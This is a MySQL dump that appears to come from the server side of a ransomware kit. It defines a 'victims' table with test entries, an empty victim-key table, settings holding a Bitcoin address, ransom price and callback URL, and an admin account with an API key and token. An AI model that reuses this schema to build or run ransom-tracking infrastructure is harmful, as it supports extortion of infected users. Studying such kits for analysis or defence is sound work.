DROP TABLE victims;

CREATE TABLE `victims` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `vid` varchar(1000) NOT NULL,
  `ip` varchar(30) NOT NULL,
  `country` varchar(10) NOT NULL,
  `info` varchar(1000) NOT NULL,
  `date` datetime NOT NULL,
  `status` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;

INSERT INTO victims VALUES("1","CRY0S688SV4","192.168.56.1","XX","Windows | MSI-PC | 7 | 6.1.7601 | AMD64 | AMD64 Family 21 Model 48 Stepping 1, AuthenticAMD","2016-04-19 10:23:41","1");
INSERT INTO victims VALUES("2","CRYWJFPK38T","127.0.0.1","XX","Windows | MSI-PC | 7 | 6.1.7601 | AMD64 | AMD64 Family 21 Model 48 Stepping 1, AuthenticAMD","2016-08-25 03:50:48","0");
INSERT INTO victims VALUES("3","CRY20ZH7UDL","127.0.0.1","XX","Windows | MSI-PC | 7 | 6.1.7601 | AMD64 | AMD64 Family 21 Model 48 Stepping 1, AuthenticAMD","2016-08-26 05:07:27","0");



DROP TABLE victim_key;

;




DROP TABLE settings;

CREATE TABLE `settings` (
  `btc_address` varchar(50) NOT NULL,
  `price` varchar(100) NOT NULL,
  `callback_url` varchar(1000) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

INSERT INTO settings VALUES("1859TUJQ4QkdCTexMTUQYu52YEJC49uLV4","1.00","http://example.com/");



DROP TABLE user;

CREATE TABLE `user` (
  `id` int(11) NOT NULL DEFAULT '0',
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `api_key` varchar(32) NOT NULL,
  `status` int(2) NOT NULL,
  `token` varchar(32) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

INSERT INTO user VALUES("1","ImamBlack","e6b01120ee4623c10c","IM4MBL4CKC0D3RZ","3","e6b01120ee4623c10c");



